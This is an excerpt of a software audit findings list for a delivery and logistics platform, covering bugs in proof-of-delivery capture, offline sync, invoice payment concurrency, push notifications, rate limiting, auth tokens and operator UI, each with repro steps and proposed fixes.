### RF-044 — POD photo/signature not enforced before marking stop complete

- **Severity:** P2
- **Domain:** driver-pod
- **Surface:** mobile-driver
- **Source:** W4-005, confirmed P2 by L1-C
- **Issue:** `payment.tsx` (lines 107–109) passes `pod?.photoUrls` and `pod?.signatureUri` directly to `completeMut.mutateAsync()` with no pre-flight check that either is present. A driver can complete a delivery stop with no photographic evidence and no signature.
- **Expected:** If the tenant requires proof-of-delivery photos or a signature, the driver should be blocked from marking a stop complete until the required evidence is captured, with a clear inline error shown.
- **Actual:** The driver can skip both photo and signature capture and mark the stop as DELIVERED with no warning or error. No evidence is required for stop completion.
- **Repro:**
  1. Authenticate as driver and navigate to a stop's completion screen.
  2. Skip both photo capture and signature collection.
  3. Tap Submit — the stop is marked DELIVERED with no error shown.
- **Fix:** Add per-tenant configuration flags (`requirePODPhoto`, `requireSignature`). Validate before calling `completeMut.mutateAsync()` and surface a blocking error if required evidence is missing.
- **Prevention:** Add a server-side validation rule on the complete-stop endpoint that checks for required POD fields when tenant config mandates them. Add a UI test covering the skip-photo → submit flow and asserting a validation error is shown.

### RF-045 — Offline sync permanently discards failed actions without notifying the driver

- **Severity:** P2
- **Domain:** driver-pod
- **Surface:** mobile-driver
- **Source:** W4-003, revised from P0 to P2 by L1-C
- **Issue:** `useNetworkSync.ts` (lines 18–20) silently dequeues any action that has exhausted `MAX_RETRIES`. Line 32–33 permanently dequeues 4xx errors. The offline queue IS persisted to AsyncStorage (items survive restarts), but once permanently removed, the driver receives no notification and has no way to know what data was lost.
- **Expected:** When an offline queued action is permanently discarded (max retries exhausted or 4xx error), the driver should receive a persistent in-app alert and be able to review the failed sync in a dedicated screen.
- **Actual:** Failed actions are silently removed from the queue. The driver has no way to know a stop completion or payment record was lost and cannot take corrective action.
- **Repro:**
  1. Queue a stop-completion action offline.
  2. When connectivity is restored, have the server return a 4xx error (e.g., stop already completed by another path).
  3. Observe the action is silently discarded — no notification, no failed inbox entry.
- **Fix:** On permanent discard, add the failed action to a "failed inbox" (persisted), show a persistent in-app alert, and surface a "Review failed syncs" screen.
- **Prevention:** Add a unit test for `useNetworkSync` that simulates max-retry exhaustion and asserts the action appears in a failed inbox. Add a failed-sync count badge to the driver app home screen.

---

### RF-046 — POD photos and signatures lost on app crash or background-kill

- **Severity:** P2
- **Domain:** driver-pod
- **Surface:** mobile-driver
- **Source:** W4-011, confirmed P2 by L1-C
- **Issue:** `podStore.ts` (line 16) uses bare `create<PodState>()` with no `persist` middleware. Captured photos and signatures are held only in memory. An OS background-kill between photo capture and stop submission permanently loses all evidence.
- **Expected:** POD photos and signatures captured by the driver should be persisted to device storage so they survive app crashes and OS background-kills and can be re-submitted when the driver reopens the app.
- **Actual:** Photos and signatures are held only in memory. An OS background-kill after capturing evidence but before submitting permanently destroys the evidence, and the driver must re-capture it — which may be impossible if they have already left the customer's location.
- **Repro:**
  1. As driver, capture a POD photo and signature on a stop.
  2. Without submitting, force-quit the driver app (OS background-kill or swipe to close).
  3. Reopen the app — the captured photo and signature are gone.
- **Fix:** Add Zustand `persist` middleware backed by `AsyncStorage` to `podStore`. Clear on successful stop completion.
- **Prevention:** Add an automated test that saves POD data to the store, simulates an app restart, and asserts the data is still present. Enforce `persist` middleware as the default pattern for any Zustand store holding actionable user data in the driver app.

---

### RF-047 — Overpayment race on concurrent payment submissions (invoice service)

- **Severity:** P2
- **Domain:** finance-pricing / concurrency
- **Surface:** API
- **Source:** W4-006, revised from P1 to P2 by L1-C; L1-D cross-reference
- **Issue:** `invoices.service.ts` (lines 1031–1041) — the `alreadyPaid` read and subsequent payment write are not protected by a serializable transaction or row-level lock. Two concurrent payment submissions for the same invoice can both pass the remaining-balance check before either commits, allowing total payments to exceed invoice amount.
- **Expected:** Concurrent payment submissions for the same invoice should be serialized so that the total recorded payments never exceed the invoice total.
- **Actual:** Two simultaneous payment requests for the full remaining balance both pass the balance check before either commits, resulting in total payments that exceed the invoice amount and produce negative AR.
- **Repro:**
  1. Create an invoice for $100 with no payments.
  2. Simultaneously fire two `POST /invoices/:id/payments` requests, each for $100.
  3. Both return HTTP 200 — $200 total payments recorded against a $100 invoice.
- **Fix:** Wrap the read-then-write in a serializable transaction or use `SELECT ... FOR UPDATE` on the invoice row.
- **Prevention:** Add a concurrency test that fires two simultaneous full-balance payment requests and asserts only one succeeds. Add a DB constraint `CHECK (alreadyPaid <= total)` on Invoice to reject over-payments at the database level.

### RF-048 — `routes.service.ts::completeStop()` marks orders DELIVERED but emits no WebSocket event or push

- **Severity:** P2
- **Domain:** real-time
- **Surface:** API / web-operator
- **Source:** W8-006, confirmed by L1-D
- **Issue:** The operator-facing stop completion path (`routes.service.ts::completeStop()`, lines 958–1036) marks orders DELIVERED but emits nothing to the gateway and calls no push notification. The driver-facing path (`orders.service.ts::completeStop()`) correctly emits `emitStopCompleted` and calls `notifications.sendToCustomer()`. When an operator completes a stop from the web UI, customers receive no WebSocket event and no push.
- **Expected:** When an operator marks a stop complete via the web dashboard, the customer should receive a push notification and/or WebSocket event informing them their delivery was completed.
- **Actual:** The operator web path completes the stop in the database but emits no events and sends no push. Customers only learn of their delivery status through manual refresh.
- **Repro:**
  1. Operator marks a stop complete via the web dashboard.
  2. Monitor the customer's device for a push notification — none arrives.
  3. Confirm the `routes.service.ts::completeStop()` method contains no `gateway.*` or `notifications.*` calls.
- **Fix:** Replicate the emit+notify block from `orders.service.ts::completeStop()` into `routes.service.ts::completeStop()`, or extract a shared helper.
- **Prevention:** Extract a shared `notifyStopCompleted()` helper that both code paths call, making it impossible to complete a stop without emitting the event. Add an integration test for the operator web stop-completion path asserting a WebSocket event is emitted.

### RF-049 — Push notification errors silently swallowed with `.catch(() => {})`

- **Severity:** P2
- **Domain:** real-time
- **Surface:** API
- **Source:** W8-005, confirmed by L1-D
- **Issue:** All three `notifications.sendToCustomer()` calls in `orders.service.ts` (lines 775, 1372, 1381) use `.catch(() => {})` — discarding errors with no logging. Combined with RF-009 (100% push failure), there is zero observability. No one will know the push system is broken.
- **Expected:** Push notification failures should be logged with enough context (error message, customer ID, notification type) to enable diagnosis and alerting. The server logs should reflect every push attempt and its outcome.
- **Actual:** All push notification errors are silently swallowed. The server logs contain no push-related entries. The 100% push failure (RF-009) cannot be detected from logs alone.
- **Repro:**
  1. Trigger any event that should send a push notification (e.g., confirm a buyer order).
  2. Check the server logs for any push-related entries.
  3. Observe no log entries exist — the failure is completely silent.
- **Fix:** Replace `.catch(() => {})` with `.catch((err) => this.logger.warn('Push notification failed', err?.message ?? String(err)))`.
- **Prevention:** Add a global ESLint rule banning bare `.catch(() => {})` patterns in service-layer code. Add a monitoring alert that fires when push notification error log volume exceeds a threshold.

---

### RF-050 — Buyer order placed; operator dashboard pending count stale until SPA navigation

- **Severity:** P2
- **Domain:** real-time / browser-ux
- **Surface:** web-operator
- **Source:** W9-007
- **Issue:** Operator on `/home` during a 60-second observation window after a buyer places a new order. Pending-orders count showed 3 for the full 60 seconds; showed 4 only after navigating away and back. This is the client-visible consequence of RF-002 (no WebSocket client) and RF-002/W9-004 (no polling).
- **Expected:** The operator dashboard pending-orders count should update within seconds of a buyer placing a new order, either via WebSocket (preferred) or via background polling.
- **Actual:** The pending-orders count remains stale for the full session duration until the operator manually navigates away from and back to the home screen.
- **Repro:**
  1. Log in as operator and note the pending-orders count on the dashboard.
  2. In another session, log in as buyer and place a new order.
  3. Watch the operator dashboard for 60 seconds — the count does not change.
  4. Navigate away and back — the count now reflects the new order.
- **Fix:** See RF-002. Immediate mitigation: add `refetchInterval: 15_000` to the pending-orders query.
- **Prevention:** Add `refetchInterval: 15_000` as a minimum for all dashboard KPI queries as an interim measure. Track and test the real-time update SLA: operator dashboard must reflect new buyer actions within 30 seconds.

---

### RF-051 — `PATCH /route-runs/:id` with User ID as `driverId` returns opaque HTTP 500

- **Severity:** P2
- **Domain:** driver-pod / API
- **Surface:** API
- **Source:** W9-006
- **Issue:** Calling `PATCH /route-runs/:runId` with `{ driverId: "<userId>" }` (where the value is `User.id` instead of `Driver.id`) returns HTTP 500 with an empty body. The Prisma FK constraint violation is not caught and translated into a client-friendly error. Nothing in the API or documentation indicates which ID type to use for `driverId`.
- **Expected:** Passing an invalid `driverId` (e.g., a User ID instead of a Driver ID) should return a clear `400 Bad Request` with a message explaining what type of ID is expected.
- **Actual:** The Prisma FK constraint violation propagates as an unhandled exception, returning HTTP 500 with an empty body and no diagnostic information.
- **Repro:**
  1. Decode the operator JWT to get the user's `sub` (User UUID).
  2. Call `PATCH /route-runs/:runId` with `{ "driverId": "<userUUID>" }`.
  3. Observe HTTP 500 with an empty response body.
- **Fix:** In `routes.service.ts::updateRun()`, catch `PrismaClientKnownRequestError` with code `P2003` and return `400 Bad Request` with a descriptive message. Consider accepting `userId` as input and resolving to `Driver.id` server-side.
- **Prevention:** Add a global Prisma error interceptor in NestJS that catches `P2003` (FK constraint violation) and maps it to a 400 response with a standard error format. Add this to the NestJS exception filter layer so it applies across all routes.

---

### RF-052 — Void invoice AR reversal undocumented; AR aging must explicitly exclude VOID

- **Severity:** P2
- **Domain:** finance-pricing
- **Surface:** API
- **Source:** W5-005 (W3-005), confirmed by L1-B
- **Issue:** `voidInvoice()` sets `status = VOID` but creates no explicit AR reversal journal entry. The method correctly blocks voiding PAID/PARTIAL invoices (no money lost), but AR aging reports not filtering VOID explicitly will overstate outstanding receivables.
- **Expected:** AR aging reports should never include VOID invoices. Voiding should produce an explicit AR reversal entry for double-entry bookkeeping completeness, or at minimum the AR aging query must filter out VOID status explicitly.
- **Actual:** VOID invoices may appear in AR aging reports if the `status !== VOID` filter is not explicitly applied, overstating the outstanding receivables balance.
- **Repro:**
  1. Create a SENT invoice for $500.
  2. Void the invoice via `POST /invoices/:id/void`.
  3. Query the AR aging report — the voided $500 may appear as outstanding.
- **Fix:** Document behavior in code comments and in the AR reporting module. Add explicit `status !== VOID` filter to all AR aging queries. Consider creating an AR reversal entry on void for double-entry bookkeeping completeness.
- **Prevention:** Add `status NOT IN ('VOID', 'DRAFT')` as a mandatory filter in all AR aggregation queries. Add a unit test asserting VOID invoices are excluded from the AR aging result. Document the invoice status lifecycle and its AR impact in the finance module's README.

---

### RF-053 — Redis adapter async connect race: silent in-memory fallback on cold start

- **Severity:** P2
- **Domain:** real-time
- **Surface:** API
- **Source:** W8-007, confirmed by L1-D
- **Issue:** `redis-io.adapter.ts` connects Redis clients via async `Promise.all()`. `createIOServer()` is synchronous and checks `if (this.adapterConstructor)` — if the promise has not resolved, condition is false and `server.adapter()` is never called. Socket.io falls back to in-memory silently. In multi-instance Railway deployment, WebSocket events drop across instances during cold start.
- **Expected:** The Redis adapter should be fully connected before the server begins accepting WebSocket connections, ensuring all multi-instance event routing works from the first connection.
- **Actual:** If the Redis connection promise has not resolved by the time `createIOServer()` is called, Socket.IO silently falls back to in-memory mode. In multi-instance deployments, WebSocket events are not broadcast across instances during cold start.
- **Repro:**
  1. Deploy the API to a multi-instance environment (e.g., Railway with 2 replicas).
  2. Monitor the startup logs — no confirmation of which Socket.IO adapter is active.
  3. Connect a WebSocket client to instance A and emit an event — instance B's connected clients do not receive it.
- **Fix:** Move Redis connection to `onModuleInit()` and await it before the server starts accepting connections. Add startup INFO log confirming adapter mode.
- **Prevention:** Add a startup health check that logs and alerts if Socket.IO is running in in-memory mode (indicating the Redis adapter failed). Add an integration test asserting events emitted on one server instance are received by clients connected to a second instance.

---

## P3 — Low Priority / Polish

### RF-054 — `GET /auth/google` nonce endpoint has no rate limit; can flood Redis with nonce keys

- **Severity:** P3
- **Domain:** auth-security
- **Surface:** API
- **Source:** L1A-001
- **Issue:** `auth.controller.ts` (lines 138–165) generates a one-time nonce and writes it to Redis with a 10-minute TTL. No `@Throttle` decorator is present. An unauthenticated attacker can create ~1,000 live `oauth:nonce:*` keys per IP (100 req/min × 10-min TTL) before Redis memory pressure becomes significant.
- **Expected:** The nonce generation endpoint should be rate-limited so a single IP cannot flood Redis with nonce keys.
- **Actual:** There is no rate limit on the nonce endpoint. An attacker can generate thousands of Redis nonce keys per minute from a single IP without any throttling.
- **Repro:**
  1. Fire 200 rapid unauthenticated `GET /auth/google` requests.
  2. Observe all return successfully with no throttling.
  3. Check Redis key count for `oauth:nonce:*` — growing without limit.
- **Fix:** Add `@Throttle({ default: { ttl: 60_000, limit: 10 } })` to `googleAuthUrl()`.
- **Prevention:** Add `@Throttle` as a mandatory decorator on all unauthenticated endpoints that create server-side state. Add a CI lint rule requiring throttle decorators on OAuth flow endpoints.

---

### RF-055 — `PATCH /users/me/preferences` accepts unbounded arbitrary keys and values

- **Severity:** P3
- **Domain:** auth-security
- **Surface:** API
- **Source:** L1A-003
- **Issue:** `users.controller.ts` (line 57) body typed as `Record<string, string>` with no class-validator pipe, no key whitelist, and no per-request size cap. Any authenticated user can write unlimited arbitrarily long key/value pairs to `UserPreference`, risking storage exhaustion.
- **Expected:** The preferences endpoint should accept only a predefined set of keys and enforce reasonable length limits on values, rejecting requests with unknown keys or oversized payloads.
- **Actual:** Any authenticated user can write unlimited keys with arbitrarily long values to their preference record, risking storage exhaustion and potential DoS.
- **Repro:**
  1. Authenticate as any user.
  2. Send `PATCH /users/me/preferences` with 10,000 keys each containing a 10KB value string.
  3. Observe HTTP 200 — all key/value pairs are accepted and stored.
- **Fix:** Introduce `UpdatePreferencesDto` with `@IsObject()`, `@MaxProperties(50)`, `@MaxLength(500)` per value. Add service-layer guard on total preference count per user.
- **Prevention:** Use class-validator with strict DTO validation (whitelist + forbidNonWhitelisted) globally. Ban `Record<string, string>` body types in NestJS controllers via a lint rule.

---

### RF-056 — Access tokens remain valid for remaining TTL after password change (~15-min window)

- **Severity:** P3
- **Domain:** auth-security
- **Surface:** API
- **Source:** W1-006, revised P3 by L1-A
- **Issue:** `auth.service.ts` (lines 322–344) revokes all refresh tokens on password change (correct). Outstanding short-lived access tokens are not blocklisted and remain valid for their remaining TTL (~15 min). Standard JWT trade-off.
- **Expected:** After a password change, all previously issued access tokens should be immediately invalidated so a compromised old token cannot be used.
- **Actual:** Old access tokens remain valid for up to 15 minutes after a password change. An attacker who obtained a user's access token retains API access during this window even after the user changes their password.
- **Repro:**
  1. Log in and obtain an access token.
  2. Change the account password.
  3. Immediately use the old access token to call any API endpoint — it succeeds for up to 15 minutes.
- **Fix:** Reduce access token TTL from 15 min to 5–10 min. Full fix requires a token blocklist (additional complexity/overhead).
- **Prevention:** Implement a Redis-backed token blocklist that stores invalidated JWT `jti` claims until their natural expiry. Include the password's hash or change timestamp as a JWT claim and validate it on each request for sensitive operations.

---

### RF-057 — Mobile API client does not handle HTTP 429 (Too Many Requests)

- **Severity:** P3
- **Domain:** auth-security / browser-ux
- **Surface:** mobile-buyer / mobile-driver
- **Source:** L1A-006
- **Issue:** `api-client.ts` (lines 63–143) handles 401 (token refresh) and network errors (offline queue) but has no 429 branch. When throttled, the raw Axios error reaches UI components showing a generic error toast rather than "slow down" messaging. May contribute to retry amplification.
- **Expected:** When the API returns HTTP 429, the mobile client should read the `Retry-After` header, surface a user-friendly "Too many requests, please wait" message, and automatically retry after the indicated delay without user action.
- **Actual:** HTTP 429 responses are treated as generic errors. A generic error toast is shown to the user with no guidance. The client may immediately retry, amplifying the rate-limit pressure.
- **Repro:**
  1. Trigger API throttling by making rapid calls from the mobile app.
  2. Observe the error toast — it shows a generic error message rather than a backoff-specific message.
- **Fix:** Add a 429 branch in the response interceptor that reads `Retry-After` and either waits/retries after the indicated delay or surfaces "too many requests, please wait."
- **Prevention:** Add 429 handling as part of the standard API client template used for all mobile apps. Add a unit test for the API client interceptor asserting that 429 responses trigger a backoff retry rather than an immediate error propagation.

---

### RF-058 — Payment method TypeScript enum can drift from Prisma schema enum

- **Severity:** P3
- **Domain:** finance-pricing
- **Surface:** mobile-buyer
- **Source:** W2-001, confirmed low-risk by L1-A
- **Issue:** `invoices.ts` (mobile, line 17) defines `PaymentMethod` as TypeScript string literals independently of the Prisma-generated enum in `create-invoice.dto.ts`. Manual sync is required; drift surfaces as silent no-op or 400 at runtime.
- **Expected:** The mobile app's `PaymentMethod` type should always be in sync with the backend Prisma enum, so new payment methods automatically become available in the mobile UI without manual updates.
- **Actual:** The mobile app defines `PaymentMethod` independently as string literals. If a new payment method is added to the backend Prisma enum, the mobile UI will not offer it until a developer also manually updates the mobile type definition — which may be forgotten.
- **Repro:**
  1. Add a new value to the `PaymentMethod` enum in `schema.prisma`.
  2. Without updating the mobile types, run the mobile app.
  3. Observe the new payment method is absent from the mobile UI.
- **Fix:** Create a shared types package (`@routeflow/types`) that exports the enum from the Prisma client. Both mobile and the DTO import from the shared package.
- **Prevention:** Add a CI check that compares the mobile `PaymentMethod` type definition against the Prisma-generated enum and fails if they differ. Migrate to a monorepo shared types package as part of the next infrastructure sprint.

---

### RF-059 — Recurring invoice prices frozen at template creation time; behavior not documented in UI

- **Severity:** P3
- **Domain:** finance-pricing
- **Surface:** web-operator
- **Source:** W3-006, confirmed by L1-B
- **Issue:** `recurring-invoices.service.ts` (lines 158–173) takes `item.unitPrice` directly from the stored template with no catalog lookup. If catalog prices change, recurring invoices silently use old prices. Behavior inconsistent with standing orders (RF-040) which use live prices.
- **Expected:** The recurring invoice template UI should clearly indicate that prices are frozen at template creation time, and provide a mechanism to update them when catalog prices change.
- **Actual:** Recurring invoices silently use the price from when the template was created, even if the catalog price has since changed. No indicator, no notification, no "sync prices" option.
- **Repro:**
  1. Create a recurring invoice template with Product A at $10.
  2. Update Product A's catalog price to $15.
  3. Wait for the next recurring invoice to generate — it uses $10 with no notification.
- **Fix:** Add a visible "Price locked at template creation" indicator in the recurring invoice template UI. Optionally add a "sync prices from catalog" action.
- **Prevention:** Document the price-locking behavior in the template creation form with a tooltip. Add a periodic job that alerts operators when recurring template prices differ from current catalog prices by more than a configurable threshold.

### RF-060 — Zero-quantity line items allowed on invoices

- **Severity:** P3
- **Domain:** finance-pricing
- **Surface:** API
- **Source:** W3-010, confirmed by L1-B
- **Issue:** `invoices.service.ts` (lines 136–143) accepts `qty = 0` line items without validation, resulting in a $0 line on a live invoice.
- **Expected:** Any line item with `qty: 0` should be rejected with a `400 Bad Request` validation error, as a zero-quantity line has no business meaning on an invoice.
- **Actual:** `qty: 0` is accepted with HTTP 201 and produces a $0 line item on the invoice that may confuse buyers and auditors.
- **Repro:**
  1. Call `POST /invoices` with a line item where `qty: 0`.
  2. Observe HTTP 201 — the invoice is created with a $0 line item.
- **Fix:** Add `@Min(1)` to the `qty` field in the invoice line-item DTO, or add a service-layer assertion.
- **Prevention:** Add `@Min(1)` to all `qty` fields across all DTOs (orders, invoices, credit notes). Add a global validation test asserting zero-quantity line items are rejected across all financial resource creation endpoints.

### RF-061 — Order demotion reason stored in mutable notes field, not an immutable audit log

- **Severity:** P3
- **Domain:** finance-pricing
- **Surface:** API
- **Source:** W3-014, confirmed by L1-B
- **Issue:** `orders.service.ts` (line 719) appends the demotion reason to the order's mutable `notes` field. Notes can be edited later, destroying the audit trail.
- **Expected:** Demotion reasons and other state-transition reasons should be recorded in an immutable audit log that cannot be overwritten by subsequent edits.
- **Actual:** Demotion reasons are appended to the mutable `notes` field. Any subsequent edit of the notes field will overwrite or obscure the demotion reason, destroying the audit trail.
- **Repro:**
  1. Demote an order with a reason.
  2. Edit the order's `notes` field.
  3. The demotion reason is overwritten and lost.
- **Fix:** Create an `OrderAuditLog` table (or immutable `auditReason` field) to record state transitions with timestamp and reason.
- **Prevention:** Implement an `OrderAuditLog` table with a create-only policy (no updates or deletes). Add all state transition endpoints to write audit entries. Add a PR checklist item: "Any status change must write an immutable audit log entry."

### RF-062 — `PaymentStatus.DRAFT` enum value is unused and confusing

- **Severity:** P3
- **Domain:** finance-pricing
- **Surface:** API
- **Source:** W3-016, confirmed by L1-B
- **Issue:** `schema.prisma` defines `PaymentStatus { DRAFT PAID VOID }` but payments are only ever created as `PAID` or `VOID`. `DRAFT` is never written. New developers may attempt a draft-payment workflow that conflicts with existing logic.
- **Expected:** All enum values in the schema should either be actively used by the codebase or explicitly removed to prevent confusion.
- **Actual:** `PaymentStatus.DRAFT` exists in the schema but is never written anywhere in the codebase. New developers encountering it may design conflicting code paths assuming it is intentional.
- **Repro:**
  1. Search the codebase: `grep -r "PaymentStatus.DRAFT" apps/api/src` — zero matches.
  2. Confirm the schema defines it but no service or controller uses it.
- **Fix:** Remove `DRAFT` from the enum (migration required), or implement and document a draft-payment workflow.
- **Prevention:** Add a CI check that fails if any schema enum value has zero usages in the source code (excluding test files), preventing dead enum values from accumulating silently.

### RF-063 — Price tier fallback is silent: misconfigured tiers fall back to list price without warning

- **Severity:** P3
- **Domain:** finance-pricing
- **Surface:** API
- **Source:** W3-008, confirmed by L1-B
- **Issue:** `pricing.ts` (line 7) — `getTierPrice()` silently falls back to list price when no tier is configured for a customer. Operators are not alerted; customers may be charged list price instead of their contracted tier price.
- **Expected:** When no pricing tier is found for a customer, the API should log a warning and optionally surface an indicator in the operator dashboard so the misconfiguration can be corrected.
- **Actual:** The fallback to list price is completely silent. Operators have no way to know a customer is being charged list price instead of their contracted tier price.
- **Repro:**
  1. Remove the pricing tier assignment for a customer.
  2. Place an order for that customer.
  3. Observe the order uses list price with no warning in the server logs or UI.
- **Fix:** Log a warning (or return a typed result indicating "fallback used") when a tier miss occurs; surface an operator-facing dashboard indicator for customers with missing tier assignments.
- **Prevention:** Add a server-side `WARN` log whenever tier fallback occurs. Add a daily operator alert listing customers with orders placed at list price who have no tier assignment. Add a unit test asserting the warning is logged on tier miss.

### RF-064 — "Remember me" checked by default at login (shared-device risk)

- **Severity:** P3
- **Domain:** auth-security / browser-ux
- **Surface:** web-operator
- **Source:** F-003 (W7/audit), confirmed P3 by L1-C
- **Issue:** The login form pre-checks "Remember me," leaving a long-lived session on shared or public devices if the user does not notice.
- **Expected:** "Remember me" should default to unchecked, requiring the user to explicitly opt in to a persistent session, minimizing risk on shared devices.
- **Actual:** The login form pre-checks "Remember me" by default. Users on shared devices who do not notice this leave a long-lived persistent session accessible to the next person who opens the browser.
- **Repro:**
  1. Navigate to the `/login` page.
  2. Observe the "Remember me" checkbox is pre-checked without any user action.
- **Fix:** Default "Remember me" to unchecked. Add a tooltip explaining persistent session implications. Consider auto-expiring sessions after configurable idle period.
- **Prevention:** Add a UI test asserting the "Remember me" checkbox is unchecked on initial page load. Add an idle session timeout (configurable per tenant) that clears tokens after a period of inactivity.

### RF-065 — `expo-notifications` logs a console warning on web (push tokens not supported)

- **Severity:** P3
- **Domain:** browser-ux
- **Surface:** web-operator
- **Source:** F-004 (W7/audit), confirmed P3 by L1-C
- **Issue:** Every load of `/home` on the web build logs `[expo-notifications] Listening to push token changes is not yet fully supported on web`. Push notifications are not wired on the web build, but the listener is unconditionally registered.
- **Expected:** The notification listener should only be registered on native (iOS/Android) builds. On web builds, no push-token warning should appear in the console.
- **Actual:** Every navigation to `/home` on the web build produces a console warning about push token support, cluttering the browser console and potentially confusing developers and QA testers.
- **Repro:**
  1. Open the production URL in a browser.
  2. Log in and navigate to `/home`.
  3. Open browser DevTools → Console — observe the `[expo-notifications]` warning.
- **Fix:** Wrap the notification listener registration in a `Platform.OS !== 'web'` guard.
- **Prevention:** Add `Platform.OS !== 'web'` as a standard guard for all native-only feature registrations in shared Expo code. Add a CI lint rule or component test asserting no native-only APIs are called unconditionally in the web build.

### RF-066 — `finance` tab hidden from nav but still accessible via direct URL (no route guard)

- **Severity:** P3
- **Domain:** browser-ux
- **Surface:** web-operator
- **Source:** NEW-W7-B, confirmed P3 by L1-C
- **Issue:** `_layout.tsx` (line 45) hides the finance tab from the bottom nav with `href: null`, but `finance.tsx` still exists and Expo Router serves it if the path is known. No route-level guard verifies authorization before rendering.
- **Expected:** If the finance tab is hidden from navigation, it should either be completely inaccessible via direct URL (redirecting to home) or have an explicit route guard that validates authorization before rendering.
- **Actual:** Navigating directly to `/finance` renders the screen without any authorization check, effectively providing unguarded access to a screen that was intentionally hidden from the navigation.
- **Repro:**
  1. Log in as operator.
  2. Navigate directly to `/finance` via the browser address bar.
  3. Observe the finance screen renders without a guard or redirect.
- **Fix:** Confirm whether finance is intentionally accessible via deep link. If not, add a guard redirecting unauthorized access. If yes, document the intended access pattern.
- **Prevention:** Establish a convention: hiding a route from navigation (`href: null`) must always be paired with a route-level guard. Add a CI test that verifies all hidden-nav routes return 403 or redirect when accessed directly.

### RF-067 — TENANT_ADMIN role displays as "Operator" in the More screen

- **Severity:** P3
- **Domain:** browser-ux
- **Surface:** web-operator
- **Source:** F-011 (W7/audit), confirmed P3 by L1-C
- **Issue:** The role chip on `/more` shows "Operator" for `TENANT_ADMIN` users, obscuring their elevated capability from the user and from any screen-sharing support session.
- **Expected:** The role chip should display "Tenant Admin" or "Admin" for `TENANT_ADMIN` users to accurately reflect their elevated permissions.
- **Actual:** `TENANT_ADMIN` users see the role chip labeled "Operator," creating confusion about their privilege level during support sessions or onboarding.

  1. Log in with a `TENANT_ADMIN` account.
  2. Navigate to `/more`.
  3. Observe the role chip displays "Operator" rather than "Admin" or "Tenant Admin."
- **Fix:** Map `TENANT_ADMIN` → "Tenant Admin" (or "Admin") in the role display logic.
- **Prevention:** Create a shared `getRoleDisplayName(role: UserRole): string` utility function used across all role display contexts. Add a snapshot test asserting the correct display string for each role value.

### RF-068 — "Pick & load (coming soon)" placeholder visible in operator nav before release

- **Severity:** P3
- **Domain:** browser-ux
- **Surface:** web-operator
- **Source:** F-014 (W7/audit)
- **Issue:** `/more` → WAREHOUSE section shows "Warehouse scanning (coming soon)" to all operator users. Sets a vague expectation.
- **Expected:** "Coming soon" placeholder entries should not be visible to end users in a production release unless there is a deliberate marketing intent with a specific launch date.
- **Actual:** All operators see "Warehouse scanning (coming soon)" in their More menu, creating false expectations about an unshipped feature with no timeline.
- **Repro:**
  1. Log in as operator.
  2. Scroll to the WAREHOUSE section in the More menu.
  3. Observe "Warehouse scanning (coming soon)" placeholder.
- **Fix:** Remove the entry or ship it before release.
- **Prevention:** Add a pre-release checklist item: "Remove all 'coming soon' placeholders unless they have a confirmed ship date within 2 weeks." Flag placeholder strings in CI by scanning for "coming soon" in navigation configuration files.

### RF-069 — Layout shifts horizontally after scroll on `/more`

- **Severity:** P3
- **Domain:** browser-ux
- **Surface:** web-operator
- **Source:** F-015 (W7/audit)
- **Issue:** Initial render of `/more` positions the column centered. After scrolling, the column appears to shift right of the previous center, leaving a wider empty area on the left. Reproducibility unverified — needs a second pass.
- **Expected:** The `/more` screen content column should remain centered in the viewport regardless of scroll position.
- **Actual:** After scrolling down on `/more`, the content column shifts right relative to its initial centered position, creating asymmetric whitespace.
- **Repro:**
  1. Navigate to `/more`.
  2. Note the initial centered position of the content column.
  3. Scroll down the page.
  4. Observe the column has shifted horizontally, leaving a wider left margin.
- **Fix:** Investigate sticky/positioned element measurement; ensure scroll container does not alter column offset.

### RF-070 — Mobile buyer orders screen has no auto-refresh; status stale until manual pull-to-refresh

- **Severity:** P3
- **Domain:** real-time / buyer-portal
- **Surface:** mobile-buyer
- **Source:** W8-002, confirmed by L1-D
- **Issue:** `useBuyerOrders()` sets `staleTime: 30_000` but has no `refetchInterval`. In React Native there is no "window focus" event. After operator confirms an order, customer's mobile orders list shows "Pending" indefinitely until manual pull-to-refresh.
- **Expected:** The buyer's orders list should automatically refresh at a reasonable interval (e.g., every 30 seconds when the screen is visible) so status changes are reflected without manual pull-to-refresh.
- **Actual:** The orders list never auto-refreshes. An order status change by the operator remains invisible to the buyer indefinitely until they manually pull-to-refresh the screen.
- **Repro:**
  1. Buyer opens the orders screen — order shows "Pending."
  2. Operator confirms the order.
  3. Buyer watches the orders screen for 60 seconds without pulling to refresh.
  4. Status remains "Pending" — no auto-update occurs.
- **Fix:** Add `refetchInterval: 30_000, refetchIntervalInBackground: false` to `useBuyerOrders()`. Add `useFocusEffect` in orders screen to call `refetch()` on focus.
- **Prevention:** Establish a standard that all list screens in mobile apps must have either `refetchInterval` or a `useFocusEffect` refetch. Add a code review checklist item for mobile screens displaying real-time-sensitive data.

### RF-071 — Driver route home has no auto-refresh; misses dispatched runs without manual action

- **Severity:** P3
- **Domain:** real-time / driver-pod
- **Surface:** mobile-driver
- **Source:** W8-003, confirmed by L1-D
- **Issue:** `useActiveRouteRun()` uses `staleTime: 30_000` with no `refetchInterval`. `useScheduledRouteRuns()` uses `staleTime: 60_000` with no `refetchInterval`. By contrast, `useLiveRoutes()` (operator) correctly uses `refetchInterval: 15_000`. Combined with RF-015 (no push on dispatch), driver can sit on "No route assigned" until manual refresh.
- **Expected:** The driver's route home screen should automatically poll for new dispatched runs at regular intervals so the driver sees a newly assigned run within 30 seconds without needing to manually refresh.
- **Actual:** The driver's route home screen never auto-refreshes. Combined with the absence of push notifications on dispatch (RF-015), a driver can remain on "No route assigned" indefinitely after a run is dispatched to them.
- **Repro:**
  1. Driver opens the route home screen — shows "No route assigned."
  2. Operator dispatches a run to this driver.
  3. Driver watches the screen for 60 seconds without interacting.
  4. The dispatched run does not appear.
- **Fix:** Add `refetchInterval: 30_000, refetchIntervalInBackground: false` to both driver hooks.
- **Prevention:** Standardize: all driver screens displaying dispatch-sensitive data must use `refetchInterval: 30_000`. Add a test asserting the `refetchInterval` configuration is present in both driver route hooks.

### RF-072 — Driver app API client not audited (coverage gap)

- **Severity:** P3
- **Domain:** auth-security / driver-pod
- **Surface:** mobile-driver
- **Source:** L1-A coverage gap note
- **Issue:** W2 only audited `apps/mobile/lib/api-client.ts`. The driver app (`apps/driver-app/`) has its own API client and auth interceptor. Its 401/429/error handling, offline queue interaction, and token refresh flow have not been reviewed.
